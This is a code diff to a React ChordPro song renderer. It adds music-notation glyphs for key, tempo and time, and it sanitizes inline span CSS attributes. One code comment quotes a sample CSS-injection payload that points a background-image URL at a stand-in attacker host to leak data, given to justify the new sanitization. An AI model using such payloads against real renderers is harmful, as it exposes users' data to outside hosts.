@@ -28,6 +28,7 @@ import { Fragment, cloneElement, isValidElement } from 'react';
 import type { CSSProperties, JSX, ReactNode } from 'react';
 
 import { ChordDiagram } from './chord-diagram';
+import { KeySignatureGlyph, MetronomeGlyph, TimeSignatureGlyph } from './music-glyphs';
 import type {
   ChordproChord,
   ChordproDirective,
@@ -195,13 +196,32 @@ function renderSpan(span: ChordproTextSpan, key: number): ReactNode {
         </span>
       );
     case 'span': {
+      // Inline-markup `{span}` attribute values are caller-supplied
+      // (they originate from the parsed ChordPro document), so
+      // route every value through `sanitizeCssValue` before
+      // committing it to the React `style` object. Sister-site to
+      // `crates/render-html/src/lib.rs::render_spans`, which
+      // filters every CSS value through the same allowlist
+      // (alphanumeric + `# . - <space> , % +`) before writing it
+      // into the inline `style="…"` attribute. Without this, a
+      // ChordPro payload like
+      // `{span foreground=red); background-image: url(//evil.example/?leak`
+      // is harmless to React's per-property style API but creates
+      // a sanitizer asymmetry between the two surfaces — flagged
+      // by `.claude/rules/sanitizer-security.md` §"Security
+      // Asymmetry" and `renderer-parity.md` §"Sanitizer Parity
+      // (React JSX surface)".
       const style: CSSProperties = {};
-      if (span.attributes.fontFamily) style.fontFamily = span.attributes.fontFamily;
-      if (span.attributes.size) style.fontSize = span.attributes.size;
-      if (span.attributes.foreground) style.color = span.attributes.foreground;
-      if (span.attributes.background) style.backgroundColor = span.attributes.background;
-      if (span.attributes.weight) style.fontWeight = span.attributes.weight;
-      if (span.attributes.style) style.fontStyle = span.attributes.style;
+      if (span.attributes.fontFamily) {
+        style.fontFamily = sanitizeCssValue(span.attributes.fontFamily);
+      }
+      if (span.attributes.size) style.fontSize = sanitizeCssValue(span.attributes.size);
+      if (span.attributes.foreground) style.color = sanitizeCssValue(span.attributes.foreground);
+      if (span.attributes.background) {
+        style.backgroundColor = sanitizeCssValue(span.attributes.background);
+      }
+      if (span.attributes.weight) style.fontWeight = sanitizeCssValue(span.attributes.weight);
+      if (span.attributes.style) style.fontStyle = sanitizeCssValue(span.attributes.style);
       return (
         <span key={key} style={style}>
           {span.children.map(renderSpan)}
@@ -1587,24 +1607,50 @@ function handleDirective(
   // is what makes the *position* aspect visible. Sister-site to
   // `crates/render-html/src/lib.rs::render_song_body_into` (Rust
   // emits the matching `<p class="meta-inline …">` shape).
-  const inlineMeta: { slug: string; label: string; body: string } | null = (() => {
-    if (kind.tag === 'key' && directive.value && directive.value.trim().length > 0) {
-      return { slug: 'key', label: 'Key', body: directive.value.trim() };
-    }
-    if (kind.tag === 'tempo' && directive.value && directive.value.trim().length > 0) {
-      return { slug: 'tempo', label: 'Tempo', body: `${directive.value.trim()} BPM` };
-    }
-    if (kind.tag === 'time' && directive.value && directive.value.trim().length > 0) {
-      return { slug: 'time', label: 'Time', body: directive.value.trim() };
-    }
-    return null;
-  })();
-  if (inlineMeta) {
+  // Each kind ships a music-notation icon next to the text label
+  // (Phase B follow-up of #2454): treble-clef + key signature for
+  // `{key}`, an animated mini metronome for `{tempo}`, and a
+  // stacked numerator / denominator glyph for `{time}`. The
+  // glyphs live in `music-glyphs.tsx`; styles for the metronome
+  // animation and the stacked time-signature typography live in
+  // `styles.css` (gated on `prefers-reduced-motion: reduce` for
+  // the metronome).
+  if (kind.tag === 'key' && directive.value && directive.value.trim().length > 0) {
+    const keyName = directive.value.trim();
     pushElement(
       ctx,
-      <p key={key} className={`meta-inline meta-inline--${inlineMeta.slug}`}>
-        <span className="meta-inline__label">{inlineMeta.label}:</span>{' '}
-        <span className="meta-inline__value">{inlineMeta.body}</span>
+      <p key={key} className="meta-inline meta-inline--key">
+        <KeySignatureGlyph keyName={keyName} className="meta-inline__glyph" />
+        <span className="meta-inline__label">Key:</span>{' '}
+        <span className="meta-inline__value">{keyName}</span>
+      </p>,
+    );
+    return;
+  }
+  if (kind.tag === 'tempo' && directive.value && directive.value.trim().length > 0) {
+    const bpmRaw = directive.value.trim();
+    const bpm = Number.parseInt(bpmRaw, 10);
+    pushElement(
+      ctx,
+      <p key={key} className="meta-inline meta-inline--tempo">
+        <MetronomeGlyph
+          bpm={Number.isFinite(bpm) ? bpm : 60}
+          className="meta-inline__glyph"
+        />
+        <span className="meta-inline__label">Tempo:</span>{' '}
+        <span className="meta-inline__value">{bpmRaw} BPM</span>
+      </p>,
+    );
+    return;
+  }
+  if (kind.tag === 'time' && directive.value && directive.value.trim().length > 0) {
+    const timeValue = directive.value.trim();
+    pushElement(
+      ctx,
+      <p key={key} className="meta-inline meta-inline--time">
+        <TimeSignatureGlyph value={timeValue} className="meta-inline__glyph" />
+        <span className="meta-inline__label">Time:</span>{' '}
+        <span className="meta-inline__value">{timeValue}</span>
       </p>,
     );
     return;
